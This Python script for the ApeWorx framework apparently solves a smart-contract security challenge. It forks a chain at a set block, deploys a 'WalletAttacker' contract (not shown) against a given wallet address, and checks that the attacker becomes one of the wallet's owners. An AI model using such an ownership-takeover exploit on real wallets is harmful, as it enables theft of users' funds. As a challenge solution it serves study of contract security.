from ape import accounts, project, Contract
from .utils.helper import fork, get_block

BLOCK = 7197929
WALLET_CONTRACT = "0x19c80e4Ec00fAAA6Ca3B41B17B75f7b0F4D64CB7"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]
    attacker.transfer(WALLET_CONTRACT, "1 ether")

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contract ---\n")
    wallet = Contract(WALLET_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.WalletAttacker.deploy(
        wallet.address,
        sender=attacker,
        # max_fee="100 gwei",
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You are now one of the owners of the wallet ---\n")

    assert wallet.isOwner(attacker.address)
    assert wallet.getTransactionCount() > 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
